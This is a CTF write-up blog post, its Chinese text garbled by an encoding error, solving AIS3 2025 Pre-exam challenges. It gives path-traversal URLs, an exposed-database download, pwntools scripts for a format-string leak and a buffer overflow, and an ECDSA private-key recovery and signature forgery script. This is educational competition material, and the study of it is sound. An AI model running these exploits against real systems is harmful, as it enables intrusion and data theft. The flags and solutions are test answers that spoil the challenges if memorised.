---
title: "2025 AIS3 Pre-exam Writeup"
date: 2025-05-24 21:20:00 +0800
categories: [CTF]
tags: [ctf, writeup, ais3]
image:
  path: /assets/images/ais3_2025_preexam.jpg
  alt: "AIS3 2025 Pre-exam Writeup"
---

> é€™æ¬¡æ˜¯ç¬¬ä¸€æ¬¡åƒåŠ  Pre-exam å¾ˆèˆˆå¥®ä½†è¢« Web é¡Œå¹¹ç ´é˜²äº†ã€‚

## Web
### Tomorin db ğŸ§
![image](https://hackmd.io/_uploads/B1z0zg0Mgx.png)
Source code `main.go`:
```go
package main

import "net/http"

func main() {
	http.Handle("/", http.FileServer(http.Dir("/app/Tomorin")))
	http.HandleFunc("/flag", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6", http.StatusFound)
  	})
  	http.ListenAndServe(":30000", nil)
}
```
é€²è¡Œ Path Traversal 
`http://chals1.ais3.org:30000/%2fflag`


![image](https://hackmd.io/_uploads/By89BxCGxx.png)

---

### Login Screen 1

![image](https://hackmd.io/_uploads/rynhreAfgl.png)

- é€²å»ç¶²ç«™å¯ä»¥çœ‹åˆ° You can log in as guest/guest å˜—è©¦ç”¨ guest/guest ç™»å…¥

![image](https://hackmd.io/_uploads/SJx1PlCfxl.png)

- The 2FA code for guest will always be `000000`

![image](https://hackmd.io/_uploads/SypfvlRzee.png)

- Only admin and view the flag.

![image](https://hackmd.io/_uploads/HyhVPxCfgx.png)

- admin/admin

![image](https://hackmd.io/_uploads/B17KPlAGex.png)

- 2FA code (å¾Œä¾†æœ‰ burp æ’ˆä½†æ²’æˆªåœ–åˆ°)

![image](https://hackmd.io/_uploads/r17nPlAGxe.png)

çœ‹äº†ä¸€ä¸‹ Source Code
ç¶²ç«™ä½¿ç”¨äº† SQLite å„²å­˜ä½¿ç”¨è€…è³‡æ–™ï¼Œå¦‚æœæ²’æœ‰å°é–éœæ…‹æª”æ¡ˆè®€å–ï¼Œé‚£éº¼é€™å€‹ SQLite æª”å°±æœƒåƒéœæ…‹æª”æ¡ˆä¸€æ¨£è¢«ç€è¦½å™¨ç›´æ¥ä¸‹è¼‰ã€‚

`init.php` :
```php
$db = new SQLite3('users.db');
```
æ‰€ä»¥èªªç•¶æˆ‘å€‘å¡äº† /users.db å°±å¯ä»¥ç›´æ¥å™´å‡º db äº†

```
http://login-screen.ctftime.uk:36368/users.db
```
`users.db` :

![image](https://hackmd.io/_uploads/ryjFulAzlx.png)

æˆåŠŸæ‹¿åˆ° 2FA code :

![image](https://hackmd.io/_uploads/S1SnOxCGgx.png)

**Flag:**
```
AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}
```

---

## Pwn
### Format Number
![image](https://hackmd.io/_uploads/S1R-pgAfeg.png)
Source Code:
```c
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>
#include <string.h>


void check_format(char *format) {
    for (int i = 0; format[i] != '\0'; i++) {
        char c = format[i];
        if (c == '\n') {
            format[i] = '\0';
            return;
        }
        if (!isdigit(c) && !ispunct(c)) {
            printf("Error format !\n");
            exit(1);
        }
    }
}

int main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    srand(time(NULL));
    int number = rand();
    int fd = open("/home/chal/flag.txt", O_RDONLY);
    char flag[0x100] = {0};
    read(fd, flag, 0xff);
    close(fd);
    
    char format[0x10] = {0};
    printf("What format do you want ? ");
    read(0, format, 0xf);
    check_format(format);

    char buffer[0x20] = {0};
    strcpy(buffer, "Format number : %3$");
    strcat(buffer, format);
    strcat(buffer, "d\n");

// "Format number : %3$<format> d\n
    printf(buffer, "Welcome", "~~~", number);

    return 0;
}

```

ç¨‹å¼æœƒæŠŠ /home/chal/flag.txt è®€é€² stack ä¸Šçš„è®Šæ•¸ flagï¼Œæ¥è‘—è®“ä½¿ç”¨è€…è¼¸å…¥æ ¼å¼åŒ–å­—ä¸²ä¾†çµ„åˆ printf(buffer, "Welcome", "~~~", number);ã€‚

é›–ç„¶æœ‰ check_format() éæ¿¾è‹±æ–‡å­—æ¯ï¼ˆä¸èƒ½ç”¨ %x, %s ç­‰ï¼‰ï¼Œä½†å¯ä»¥ç”¨ %% è¼¸å‡º %ï¼Œç¹éé™åˆ¶ï¼Œä¾‹å¦‚ï¼š
```
è¼¸å…¥ï¼š%%20$
â†’ è®Šæˆï¼š%3$%20$d
â†’ å°å‡º stack ä¸Šç¬¬ 20 å€‹å€¼
```

Payload:
```python
from pwn import *

context.log_level = "debug"
context.arch = "i386"

with open("flag.txt", "w") as f:
    pass

for i in range(20, 70):
    payload = f"%%{i}$"
    print(f"[*] æ­£åœ¨ç™¼é€ payload: {payload}")

    p = remote("chals1.ais3.org", 50960)
    #p = process("./chal")
    p.sendlineafter(b"What format do you want ?", payload.encode()) 

    try:
        p.recvuntil(b"%", timeout=1) 
        res = p.recvline(timeout=1)
        print(f"[{i}] => {res}")
        with open("flag.txt", "ab") as f:
            f.write(res)
    except Exception as e:
        # å¦‚æœæ¥æ”¶å¤±æ•— (ä¾‹å¦‚è¶…æ™‚)
        print(f"[{i}] => (æ²’æœ‰å›æ‡‰): {e}")
        with open("flag.txt", "a") as f:
            f.write(f"[{i}] => (æ²’æœ‰å›æ‡‰)\n")
    finally:
        # é—œé–‰é€£ç·š
        p.close()

print("[*] æ¸¬è©¦å®Œæˆï¼Œçµæœå·²å­˜æ–¼ flag.txt")
```

**Flag:**
```
AIS3{S1d3_ch@nn3l_0n_fOrM47_strln&_!!!}
```

---

### Welcome to the World of Ave MujicağŸŒ™
![image](https://hackmd.io/_uploads/H1xleWAMgx.png)

Run èµ·ä¾†ï¼š
![image](https://hackmd.io/_uploads/r1O-fbAfex.png)

é€™é¡Œæ˜¯å€‹ç°¡å–®çš„ Buffer Overflow é¡Œç›®

ç¨‹å¼é€é read_int8() è®€å…¥ä¸€å€‹å€¼çµ¦ int8ï¼Œä¸¦ç”¨å®ƒç•¶ä½œ read(0, buf, int8) çš„å¤§å°ã€‚é›–ç„¶æª¢æŸ¥äº† int8 <= 127ï¼Œä½†ï¼š
- æ²’æª¢æŸ¥ è² æ•¸
- int8 æ˜¯ signed 8-bitï¼Œå‚³å…¥å¦‚ -50 æœƒè¢«è½‰æˆ unsigned 0xCE = 206ï¼Œé€ æˆ overflow
```c
char buf[143];
read(0, buf, int8);  // <-- æœªæª¢æŸ¥ int8 < 0ï¼Œé€ æˆ overflow
```

å¯ä»¥åˆ©ç”¨é€™å€‹è¡Œç‚ºè“‹æ‰ return addressï¼Œè·³åˆ° backdoorã€‚

Payload:
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

# p = process("./chal")
p = remote("chals1.ais3.org", 60761)

backdoor_address = 0x0000000000401256

payload = b'a' * 0xa8 + p64(backdoor_address)

p.sendlineafter(b"?", b"yes")               
p.sendlineafter(b":", str(-50).encode())   
p.sendlineafter(b":", payload)            

p.interactive()
```

**Flag:**
```
AIS3{Ave MujicağŸ­å°‡å¥‡è¹Ÿå¸¶å…¥æ—¥å¸¸ä¸­ğŸ›(FortunağŸ’µğŸ’µğŸ’µ)...Ave MujicağŸ­ç‚ºä½ ç»ä¸Šæ…ˆæ‚²æ†æ†«âœï¸(LacrimağŸ˜­ğŸ¥²ğŸ’¦)..._9be8fabfb7bf8785da6a455cfea4683b}
```

---

## Misc
### Ramen CTF
![image](https://hackmd.io/_uploads/r1S9GxRzxe.png)

æ ¹æ“šé¡Œç›®çµ¦çš„åœ–ç‰‡ä¸­ç™¼ç¥¨ QRcode æƒå‡ºè³‡è¨Šä¹‹å¾Œè‡³ Google maps æŸ¥è©¢
`MF1687991111404137095000001f4000001f40000000034785923VG9sG89nFznfPnKYFRlsoA==:**:2:2:1:è¦æ‹‰`
![image](https://hackmd.io/_uploads/ry-_lgRGxl.png)
![image](https://hackmd.io/_uploads/SyaLZxCzgg.png)
![image](https://hackmd.io/_uploads/Hy2mGeAMle.png)

**Flag:**
```
AIS3{æ¨‚å±±æº«æ³‰æ‹‰éºµ:è¦æ‹‰éºµ}
```

---

### AIS3 Tiny Server - Web / Misc
![image](https://hackmd.io/_uploads/rJi-7xAzlg.png)
é€²å»ç¶²ç«™å¾Œç™¼ç¾æœ‰æåˆ° root dir ä¸‹æœ‰æ±è¥¿å˜—è©¦å¡ URL encode ä¾† Path Traversal
`chals1.ais3.org:20056/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f`
å˜—è©¦æˆåŠŸå¾Œï¼Œç¢ºå¯¦æœ‰ flag æª”æ¡ˆã€‚
![image](https://hackmd.io/_uploads/Syv6mxRGlg.png)
æ’ˆå‡ºå¾Œæ‹¿åˆ° flag

**Flag:**
```
AIS3{tInY_weB_$3rveR_W17H_fIL3_8R0Ws1n9_AS_@_Featur3}
```

---

### Welcome

<img src="https://hackmd.io/_uploads/r1pw8tafle.png" alt="image" width="50%" style="display: block; margin: 0 auto;">

æ‰‹æ•²å‡º Flag

**Flag:**
```
AIS3{Welcome_And_Enjoy_the_CTF_!}
```

---

## Crypto
> ~~é€™æ˜¯ä¸€å ´AIå¤§æˆ°~~

### SlowECDSA
![image](https://hackmd.io/_uploads/HkajMZCMeg.png)

æ¼æ´åˆ†æ æ¼æ´é»ï¼šå¯é æ¸¬çš„ Nonce k
ECDSA ç°½ç« çš„å®‰å…¨æ€§é«˜åº¦ä¾è³´æ–¼æ¯æ¬¡ç°½ç« æ‰€ä½¿ç”¨çš„éš¨æ©Ÿæ•¸ (nonce) k çš„ä¸å¯é æ¸¬æ€§èˆ‡å”¯ä¸€æ€§ã€‚å¦‚æœ k å¯ä»¥è¢«é æ¸¬ã€é‡è¤‡ä½¿ç”¨æˆ–å…¶ç”Ÿæˆæ–¹å¼å­˜åœ¨ç¼ºé™·ï¼Œå‰‡å¯èƒ½å°è‡´ç§é‘° sk çš„æ´©æ¼ã€‚

åœ¨æ­¤é¡Œç›®ä¸­ï¼Œnonce k æ˜¯ç”±ä¸€å€‹ç·šæ€§åŒé¤˜æ³•ç”Ÿæˆå™¨ (LCG) æ‰€ç”¢ç”Ÿï¼š
```python
class LCG:
    def __init__(self, seed, a, c, m):
        self.state = seed
        self.a = a
        self.c = c
        self.m = m

    def next(self):
        self.state = (self.a * self.state + self.c) % self.m
        return self.state

# ...
lcg = LCG(seed=int.from_bytes(os.urandom(24), 'big'), a=1103515245, c=12345, m=order)
# ...
def sign(msg: bytes):
    # ...
    k = lcg.next() # Nonce k is generated by LCG
    # ...
```
è‹¥å–å¾—å…©çµ„ç°½ç«  (r1, s1)ã€(r2, s2) å°ç›¸åŒè¨Šæ¯ example_msgï¼Œå°±å¯ä»¥å»ºç«‹å¦‚ä¸‹é—œä¿‚ï¼š
ECDSA ç°½ç« å…¬å¼ï¼š
$$
s = k^{-1}(h + r \cdot sk) \mod order
$$

å¯æ¨å‡ºï¼š

$$
k = s^{-1}(h + r \cdot sk) \mod order
$$

å†åˆ©ç”¨ LCG çš„æ€§è³ªï¼š

$$
k_2 \equiv (a \cdot k_1 + c) \mod order
$$

æœ€çµ‚æ¨å‡ºç§é‘° sk çš„å…¬å¼ç‚ºï¼š

$$
sk \equiv \frac{a s_1^{-1} h - s_2^{-1} h + c}{s_2^{-1} r_2 - a s_1^{-1} r_1} \mod order
$$

Payload
```python
import hashlib, socket, re
from ecdsa import NIST192p
from Crypto.Util.number import inverse, bytes_to_long

A = 1103515245
C = 12345
curve = NIST192p
order = curve.order
G = curve.generator

def recv_until_prompt(sock, prompt="Enter option: "):
    data = b""
    while not data.endswith(prompt.encode()):
        data += sock.recv(1024)
    return data.decode()

def get_example_sig(sock):
    sock.sendall(b"get_example\n")
    response = recv_until_prompt(sock)
    msg = re.search(r"msg: (.*)", response).group(1).strip().encode()
    r = int(re.search(r"r: (0x[0-9a-fA-F]+)", response).group(1), 16)
    s = int(re.search(r"s: (0x[0-9a-fA-F]+)", response).group(1), 16)
    return msg, r, s

def solve():
    with socket.create_connection(("chals1.ais3.org", 19000)) as s:
        recv_until_prompt(s)

        # Step 1: Get two example signatures
        m1, r1, s1 = get_example_sig(s)
        m2, r2, s2 = get_example_sig(s)
        assert m1 == m2
        h = bytes_to_long(hashlib.sha1(m1).digest()) % order

        # Step 2: Recover private key
        s1_inv = inverse(s1, order)
        s2_inv = inverse(s2, order)
        numerator = (A * s1_inv * h - s2_inv * h + C) % order
        denominator = (s2_inv * r2 - A * s1_inv * r1) % order
        sk = (numerator * inverse(denominator, order)) % order

        # Step 3: Recover LCG state (k2)
        k2 = (s2_inv * (h + r2 * sk)) % order
        k_flag = (A * k2 + C) % order

        # Step 4: Sign "give_me_flag"
        msg = b"give_me_flag"
        h_flag = bytes_to_long(hashlib.sha1(msg).digest()) % order
        R = k_flag * G
        r = R.x() % order
        s_ = (inverse(k_flag, order) * (h_flag + r * sk)) % order

        # Step 5: Send forged signature
        s.sendall(b"verify\n")
        recv_until_prompt(s)
        s.sendall(msg + b"\n")
        recv_until_prompt(s)
        s.sendall(f"{hex(r)}\n".encode())
        recv_until_prompt(s)
        s.sendall(f"{hex(s_)}\n".encode())

        print(s.recv(4096).decode())

if __name__ == "__main__":
    solve()
```

---

### Stream
![image](https://hackmd.io/_uploads/S1TWUW0Ggg.png)

é¡Œç›®æä¾›äº†ä¸€å€‹ Python è…³æœ¬ chal.py å’Œä¸€å€‹è¼¸å‡ºæ–‡ä»¶ output.txtã€‚chal.py çš„å…§å®¹å¦‚ä¸‹ï¼š

```python
from random import getrandbits
import os
from hashlib import sha512
from flag import flag # å‡è¨­ flag.py ä¸­å®šç¾©äº† flag è®Šæ•¸

def hexor(a: bytes, b: int):
    return hex(int.from_bytes(a)^b**2)

for i in range(80):
    # æ¯æ¬¡è¿­ä»£éƒ½ä½¿ç”¨ä¸€å€‹æ–°çš„éš¨æ©Ÿä½å…ƒçµ„çš„ SHA512 é›œæ¹Šå€¼å’Œä¸€å€‹æ–°çš„ 256 ä½å…ƒéš¨æ©Ÿæ•¸
    print(hexor(sha512(os.urandom(True)).digest(), getrandbits(256)))

# æœ€å¾Œï¼Œä½¿ç”¨ flag å’Œä¸€å€‹æ–°çš„ 256 ä½å…ƒéš¨æ©Ÿæ•¸
print(hexor(flag, getrandbits(256)))
```
output.txt  åŒ…å«äº† 81 è¡Œåå…­é€²åˆ¶ç·¨ç¢¼çš„å­—ä¸²ï¼Œå‰ 80 è¡Œæ˜¯ç”± sha512 é›œæ¹Šå€¼åŠ å¯†å¾—åˆ°çš„ï¼Œæœ€å¾Œä¸€è¡Œå‰‡æ˜¯ç”± flag åŠ å¯†å¾—åˆ°çš„ã€‚æˆ‘å€‘çš„ç›®æ¨™æ˜¯å¾ output.txt ä¸­æ‰¾å‡º flagã€‚

åŠ å¯†æµç¨‹åˆ†æ
`chal.py` ä¸­çš„æ ¸å¿ƒåŠ å¯†é‚è¼¯ç‚º `hexor` å‡½æ•¸ï¼Œå…¶é‹ä½œå¦‚ä¸‹ï¼š
1. æ¥æ”¶å…©å€‹åƒæ•¸ï¼š
   - `a`: ä¸€å€‹ä½å…ƒçµ„ä¸²ï¼ˆå¦‚ SHA512 é›œæ¹Šæˆ– flagï¼‰
   - `b`: ä¸€å€‹ 256 ä½å…ƒéš¨æ©Ÿæ•´æ•¸
2. æ­¥é©Ÿï¼š
   - å°‡ `a` è½‰ç‚ºæ•´æ•¸ï¼š`P = int.from_bytes(a)`
   - è¨ˆç®—å¹³æ–¹ï¼š`K_sq = b**2`
   - åŸ·è¡Œ XORï¼š`Result_int = P ^ K_sq`
   - è¼¸å‡ºç‚º hex å­—ä¸²ï¼š`hex(Result_int)`
3. åŸ·è¡Œé‚è¼¯ï¼š
   - å‰ 80 æ¬¡è¿´åœˆï¼š
     - `a = sha512(os.urandom(1)).digest()`ï¼ˆéš¨æ©Ÿå–®ä½å…ƒçµ„çš„ SHA512ï¼‰
     - `b = getrandbits(256)`ï¼ˆéš¨æ©Ÿ 256 ä½å…ƒæ•´æ•¸ï¼‰
   - æœ€å¾Œä¸€æ¬¡ï¼š
     - `a = flag`ï¼ˆæ˜æ–‡ flagï¼‰
     - `b = æ–°çš„éš¨æ©Ÿ 256 ä½å…ƒæ•´æ•¸`

å› æ­¤æ¯ä¸€è¡ŒåŠ å¯†è³‡æ–™å¯ä»¥å½¢å¼åŒ–ç‚ºï¼š
C_hex = hex(P âŠ• KÂ²)
å…¶ä¸­ï¼š
- `P` ç‚ºæ˜æ–‡ï¼ˆflag æˆ– SHA512 hashï¼‰
- `K` ç‚º 256-bit éš¨æ©Ÿæ•´æ•¸

åŠ å¯†å¼±é»åˆ†æ

åŸç†ç°¡è¿°

æ­¤åŠ å¯†æ–¹å¼çš„é—œéµå¼±é»åœ¨æ–¼ï¼š

> **æ˜æ–‡é•·åº¦ << é‡‘é‘°å¹³æ–¹çš„ä½å…ƒé•·åº¦æ™‚ï¼Œç•°æˆ–å¾Œçš„çµæœä»ã€Œæ¥è¿‘ã€é‡‘é‘°å¹³æ–¹ã€‚**

ä½å…ƒé•·åº¦å°æ¯”
- `K`: ç‚º 256 ä½å…ƒæ•´æ•¸
  - æ‰€ä»¥ `KÂ²`: ç´„ç‚º 512 ä½å…ƒ
- `P_flag`: flag ç‚ºçŸ­å­—ä¸²ï¼ˆä¾‹å¦‚ 20â€“60 bytes = 160â€“480 bitsï¼‰
  - æ¯” `KÂ²` å°å¾ˆå¤š
XOR çµæœçš„ç‰¹æ€§

å°æ–¼å¾ˆå°çš„ `P`ï¼ˆå¦‚ flagï¼‰ï¼Œ`C = P âŠ• KÂ²` çµæœæœƒå¾ˆæ¥è¿‘ `KÂ²`ï¼š

- é«˜ä½çš„ `KÂ²` å¹¾ä¹ä¸æœƒè¢«æ”¹è®Š
- XOR çš„å½±éŸ¿åªå‡ºç¾åœ¨ä½ä½ï¼ˆå› ç‚º `P` çš„é«˜ä½éƒ½æ˜¯ 0ï¼‰

å› æ­¤ï¼Œæœ‰ä»¥ä¸‹è¿‘ä¼¼å¼ï¼š
C â‰ˆ KÂ²  âŸ¹  K â‰ˆ isqrt(C)
å³ï¼šåªè¦å° `C` å–æ•´æ•¸å¹³æ–¹æ ¹å³å¯è¿‘ä¼¼å¾—åˆ° `K`ï¼

SHA512 éƒ¨åˆ†çš„é™åˆ¶
- `P_sha = int.from_bytes(sha512_hash)`ï¼Œé•·åº¦ç‚º 512 bits
- æ­¤æ™‚ `P_sha` å’Œ `KÂ²` é•·åº¦ç›¸ç•¶
- XOR ä¸å†åå‘ä½ä½ï¼Œå› æ­¤çµæœ `C` å’Œ `KÂ²` çš„å·®è·è®Šå¤§
- â†’ **å¹³æ–¹æ ¹åæ¨ä¸æº–ç¢ºï¼Œçµæœæ˜¯äº‚ç¢¼**

Payload :
```python
import math
import string

# Python 3.8 ä¹‹å‰çš„ç‰ˆæœ¬å¯èƒ½æ²’æœ‰ math.isqrtï¼Œé€™è£¡æä¾›ä¸€å€‹ polyfill
try:
    _ = math.isqrt
except AttributeError:
    def isqrt(n):
        if n < 0:
            raise ValueError("isqrt() argument must be non-negative")
        if n == 0:
            return 0
        x = int(math.sqrt(n))
        while x * x > n:
            x -= 1
        while (x + 1) * (x + 1) <= n:
            x += 1
        return x
    math.isqrt = isqrt

def hex_to_bytes(hex_str):
    """å°‡åå…­é€²åˆ¶å­—ä¸²è½‰æ›ç‚ºä½å…ƒçµ„ä¸²ã€‚"""
    try:
        num = int(hex_str, 16)
        # è¨ˆç®—ä½å…ƒçµ„é•·åº¦ï¼Œè™•ç† 0 çš„æƒ…æ³
        byte_len = (num.bit_length() + 7) // 8
        if byte_len == 0 and num == 0:
            return b'\x00' # å¦‚æœæ˜¯ 0ï¼Œè¿”å›ä¸€å€‹ null byte
        if byte_len == 0: # æ­¤æ¢ä»¶ç†è«–ä¸Šåœ¨ num != 0 æ™‚ä¸æœƒé”åˆ°
            return b''
        return num.to_bytes(byte_len, 'big')
    except Exception: # å¯¬æ³›çš„ç•°å¸¸æ•ç²
        return b''

# è²¼ä¸Š output.txt çš„å…§å®¹
hex_data = """
0xc900d26d54a60819abf46f3380bdc0d4b29d16bfde908e824f67ddc9d1f945a9e252deaf60dc7336c7efd5f7e11e943bdb9d8484254e3e4bf228e676e692ab97
# ... (output.txt çš„å…¶é¤˜å…§å®¹çœç•¥ä»¥ä¿æŒç°¡æ½”) ...
0x1a95888d32cd61925d40815f139aeb35d39d8e33f7e477bd020b88d3ca4adee68de5a0dee2922628da3f834c9ada0fa283e693f1deb61e888423fd64d5c3694
""".strip().split('\n') # [cite: 1] (å¼•ç”¨ output.txt çš„çµæ§‹)

found_flag = None

for h_str in hex_data:
    h_str = h_str.strip()
    if not h_str: continue
    
    H = int(h_str, 16) # C_int: å¯†æ–‡çš„æ•´æ•¸è¡¨ç¤º
    K_approx = math.isqrt(H) # K_cand1: isqrt(C_int)

    # æª¢æŸ¥ K_approx^2 å’Œ (K_approx+1)^2
    # çœŸå¯¦çš„ K å¯èƒ½æ˜¯ K_approx æˆ– K_approx + 1
    for k_val in [K_approx, K_approx + 1]: # K_cand
        F = H ^ (k_val**2) # Potential_Plaintext_int = C_int ^ (K_cand^2)
        b = hex_to_bytes(hex(F)) # è½‰æ›å›ä½å…ƒçµ„ä¸²

        try:
            s = b.decode('ascii') # å˜—è©¦ ASCII è§£ç¢¼
            # æª¢æŸ¥æ˜¯å¦ç‚ºå¯è®€çš„ ASCII ä¸”é•·åº¦åˆç†
            # ä¸¦æª¢æŸ¥æ˜¯å¦åŒ…å« flag çš„å¸¸è¦‹æ ¼å¼
            if len(s) > 10 and all(c in string.printable for c in s):
                # å„ªå…ˆé¸æ“‡åŒ…å« flag æ ¼å¼çš„å­—ä¸²
                if '{' in s and '}' in s: # flag ç‰¹å¾µæª¢æŸ¥
                    found_flag = s
                    break 
        except UnicodeDecodeError:
            pass # ä¸æ˜¯æœ‰æ•ˆçš„ ASCII
        except Exception as e:
            # print(f"è™•ç† {h_str} æ™‚ç™¼ç”ŸéŒ¯èª¤: {e}") # å¯é¸ï¼šèª¿è©¦æ™‚ä½¿ç”¨
            pass
            
    if found_flag:
        break # å¦‚æœæ‰¾åˆ°äº† flagï¼Œå°±åœæ­¢éæ­·

if found_flag:
    print("\n--- æ‰¾åˆ°äº†å¯èƒ½çš„ Flag ---")
    print(found_flag)
else:
    print("\n--- æœªèƒ½æ‰¾åˆ° Flag ---")
```

---

### Hill
![image](https://hackmd.io/_uploads/SyaWaWCfle.png)

ç’°å¢ƒå‡è¨­
- æ˜æ–‡èˆ‡å¯†æ–‡çš†ç‚º 8 å­—ç¯€ï¼ˆ64 ä½å…ƒï¼‰å‘é‡ï¼Œmodulo p çš„é‹ç®—ã€‚
- åŠ å¯†æ–¹å¼ç‚ºï¼š
  - ç¬¬ä¸€åˆ†çµ„ï¼š`Câ‚€ = (A â‹… Pâ‚€) mod p`
  - ç¬¬äºŒåˆ†çµ„èµ·ï¼š`Cáµ¢ = (A â‹… Páµ¢ + B â‹… Páµ¢â‚‹â‚) mod p`
- ç›®æ¨™æ˜¯å¾å¯æ§æ˜æ–‡èˆ‡å¯†æ–‡ä¸­æ¨å°å‡ºçŸ©é™£ `A` èˆ‡ `B`ï¼Œé€²è€Œè§£å¯†æ——æ¨™ã€‚

éšæ®µä¸€ï¼šæ¢å¾©çŸ©é™£ A
åŸç†
- å‡è¨­çŸ©é™£ `A` ç‚º nÃ—nï¼Œç¸½å…±æœ‰ nÂ² å€‹æœªçŸ¥æ•¸ã€‚
- ç™¼é€ n çµ„æ¨™æº–åŸºå‘é‡ `Pâ‚€(j) = eâ±¼` çµ¦ä¼ºæœå™¨ï¼ˆå…¶ä¸­ç¬¬ j ä½ç‚º 1ï¼Œå…¶é¤˜ç‚º 0ï¼‰ã€‚
- æ¯æ¬¡æ”¶åˆ°å°æ‡‰å¯†æ–‡ `Câ‚€(j)` å³ç‚ºçŸ©é™£ `A` çš„ç¬¬ j æ¬„ã€‚
æ­¥é©Ÿ
1. å°æ–¼ k = 0 åˆ° nâˆ’1ï¼š
   - æ§‹é€ æ˜æ–‡ï¼š`Pâ‚€(k) = b'\x00' * k + b'\x01' + b'\x00' * (n-k-1)`
   - ç™¼é€æ˜æ–‡ `Pâ‚€(k)` çµ¦ä¼ºæœå™¨ã€‚
   - æ¥æ”¶å¯†æ–‡ `Câ‚€(k)`ï¼Œå³ç‚º A çš„ç¬¬ k æ¬„ã€‚
2. çµ„åˆå‡ºçŸ©é™£ `A`ï¼š
   ```python
   A = [Câ‚€(0) | Câ‚€(1) | ... | Câ‚€(n-1)]
   ```
 
éšæ®µäºŒï¼šæ¢å¾©çŸ©é™£ B
åŸç†
- ä½¿ç”¨åŠ å¯†ç¬¬äºŒå€‹åˆ†çµ„çš„å…¬å¼ï¼š  
  `Câ‚ = (Aâ‹…Pâ‚ + Bâ‹…Pâ‚€) mod p`
- é¸æ“‡ `Pâ‚ = 0`ï¼Œä½¿ `Aâ‹…Pâ‚ = 0`ã€‚
- å‰‡ï¼š  
  `Bâ‹…Pâ‚€ = Câ‚ mod p`ï¼Œèˆ‡ A çš„æ¢å¾©æ–¹å¼ä¸€è‡´ã€‚
æ­¥é©Ÿ
1. å°æ–¼ k = 0 åˆ° nâˆ’1ï¼š
   - æ˜æ–‡ç‚º 2 çµ„åˆä½µï¼š
     ```python
     Pâ‚€(k) = b'\x00' * k + b'\x01' + b'\x00' * (n-k-1)
     Pâ‚(k) = b'\x00' * n
     P_total = Pâ‚€(k) + Pâ‚(k)
     ```
   - ç™¼é€æ˜æ–‡ `P_total` çµ¦ä¼ºæœå™¨ã€‚
   - æ¥æ”¶å¯†æ–‡åˆ†çµ„ `C_tmp(k)` èˆ‡ `C_B(k)`ï¼š
     - `C_tmp(k) = Aâ‹…Pâ‚€(k) mod p`
     - `C_B(k) = Bâ‹…Pâ‚€(k) mod p`ï¼ˆå› ç‚º Pâ‚ ç‚ºé›¶å‘é‡ï¼‰
2. çµ„åˆå‡ºçŸ©é™£ `B`ï¼š
   ```python
   B = [C_B(0) | C_B(1) | ... | C_B(n-1)]
   ```
éšæ®µä¸‰ï¼šè§£å¯†æ——æ¨™
åŸç†
- å·²çŸ¥å¯†æ–‡åˆ†çµ„ï¼š`C_flag[0], ..., C_flag[4]`
- è§£å¯†å…¬å¼å¦‚ä¸‹ï¼š
  - ç¬¬ä¸€çµ„ï¼š
    ```math
    P_flag[0] = Aâ»Â¹ â‹… C_flag[0] mod p
    ```
  - å…¶é¤˜åˆ†çµ„ï¼š
    ```math
    P_flag[i] = Aâ»Â¹ â‹… (C_flag[i] âˆ’ Bâ‹…P_flag[iâˆ’1]) mod p
    ```
æ­¥é©Ÿ
1. è§£æå¯†æ–‡åˆ†çµ„ç‚ºæ•¸å­—å‘é‡åˆ—è¡¨ï¼š
   ```python
   C_flag = [Câ‚€, Câ‚, Câ‚‚, Câ‚ƒ, Câ‚„]
   ```
2. è¨ˆç®—çŸ©é™£æ¨¡é€†ï¼š
   ```python
   A_inv = inverse_mod_matrix(A, p)
   ```
3. è§£å¯†ç¬¬ä¸€å€‹æ˜æ–‡åˆ†çµ„ï¼š
   ```python
   P_flag[0] = (A_inv â‹… C_flag[0]) % p
   ```
4. è§£å¯†å¾ŒçºŒæ˜æ–‡åˆ†çµ„ï¼š
   ```python
   for i in range(1, 5):
       term_B = (B â‹… P_flag[i-1]) % p
       diff = (C_flag[i] - term_B + p) % p
       P_flag[i] = (A_inv â‹… diff) % p
   ```
5. å°‡æ‰€æœ‰æ˜æ–‡åˆ†çµ„é‚„åŸç‚ºå­—ä¸²ï¼š
   ```python
   flag_bytes = b''.join(long_to_bytes_groupwise(P_flag[i]) for i in range(5))
   flag = flag_bytes.rstrip(b'\x00').decode('utf-8')
   ```
æˆåŠŸè§£å‡ºåŸå§‹æ——æ¨™ `flag{...}`ï¼Œéç¨‹é‹ç”¨æ¨¡çŸ©é™£é‹ç®—ã€å‘é‡æ¨å°èˆ‡ç·šæ€§ä»£æ•¸åæ¨å¯†é‘°çŸ©é™£ã€‚

Payload :
```python
#!/usr/bin/env python3
# Easist Block Cipher â€“ single-shot solver
# éœ€æ±‚ï¼špython3 -m pip install pwntools numpy

from pwn import *
import numpy as np, re

HOST, PORT = "chals1.ais3.org", 18000
P, N       = 251, 8            # æœ‰é™é«” Fâ‚šã€block size
FLAG_BLKS  = 5                 # æ——æ¨™å›ºå®š 5 å¡Š

context.log_level = "info"     # æ”¹ "debug" çœ‹å®Œæ•´ I/O

io = remote(HOST, PORT)

# â”€â”€ 0. è®€å–æ——æ¨™çš„å¯†æ–‡ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
io.recvuntil(b"Encrypted flag:\n")
num_pat = re.compile(rb'-?\d+')
flag_ct = []
for _ in range(FLAG_BLKS):
    ln = io.recvline()
    flag_ct.append(np.array(list(map(int, num_pat.findall(ln))), dtype=int) % P)

# â”€â”€ 1. æº–å‚™ä¸€æ¬¡å°±èƒ½è§£ Aã€B çš„ 16 å¡Šæ˜æ–‡ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#   P0=e0 , P1=q , P2=e1 , P3=q , â€¦ , P14=e7 , P15=q
#   å…¶ä¸­  e_k = b"01111111..."  (ç¬¬ k ä½æ˜¯ '1')
#        q   = b"00000000"     (å…¨éƒ¨ '0')
blk_q  = b"0" * N
payload = bytearray()
for k in range(N):
    e = bytearray(b"0" * N)
    e[k] = ord('1')
